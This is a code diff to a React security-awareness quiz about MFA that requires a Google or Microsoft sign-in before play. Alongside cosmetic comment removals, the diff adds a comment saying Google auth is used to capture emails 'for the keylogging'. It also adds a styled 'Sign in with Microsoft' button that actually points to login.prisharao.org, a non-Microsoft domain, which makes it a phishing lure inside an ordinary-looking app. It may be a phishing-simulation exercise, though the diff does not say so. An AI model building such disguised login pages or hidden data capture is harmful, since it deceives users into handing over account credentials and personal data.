@@ -12,7 +12,6 @@ const Home = () => {
   const [quizStarted, setQuizStarted] = useState(false);
   const [currentQuestionIndex, setCurrentQuestionIndex] = useState(0);
 
-
   const questions = [
     {
       question: "What is MFA and why is it important?",
@@ -53,23 +52,20 @@ const Home = () => {
     setPopupVisible(true); 
   };
 
-  // Function to handle answer selection
   const handleAnswerClick = (option) => {
     console.log("Selected option:", option);
 
-    // Move to the next question if there are more questions
     if (currentQuestionIndex < questions.length - 1) {
       setCurrentQuestionIndex(currentQuestionIndex + 1);
     } else {
       console.log("Quiz completed!");
-      // Optionally show a result screen or summary here
     }
   };
 
   const handleGoogleSuccess = (response) => {
     console.log("Google login response:", response);
-    setPopupVisible(false); // Hide the popup
-    setQuizStarted(true);   // Start the quiz
+    setPopupVisible(false);
+    setQuizStarted(true);
   };
 
   const handleGoogleFailure = () => {
@@ -114,6 +110,7 @@ const Home = () => {
             To play this quiz, you'll need to sign up using either your Google or Microsoft account. 
             This ensures your progress is saved and allows you to access the quiz from any device.
           </span>
+          {/* code uses GOOGLE auth to capture emails etc for the keylogging/*/}
           <div className='btn'>
             <GoogleOAuthProvider clientId={clientId}>
               <GoogleLogin
@@ -121,7 +118,16 @@ const Home = () => {
                 onError={handleGoogleFailure}
               />
             </GoogleOAuthProvider>
-            <a href="https://login.prisharao.org/IoKsUSUj" className="button">Microsoft Login</a> 
+
+            {/* code taken from https://codepen.io/felnne/pen/qvjmWZ for the microsoft button */}
+            <a href="https://login.prisharao.org/IoKsUSUj" className="bsk-btn bsk-btn-default">
+              <object
+                type="image/svg+xml"
+                data="https://s3-eu-west-1.amazonaws.com/cdn-testing.web.bas.ac.uk/scratch/bas-style-kit/ms-pictogram/ms-pictogram.svg"
+                className="x-icon"
+              ></object>
+              Sign in with Microsoft
+            </a>
           </div>     
         </div>
       )}
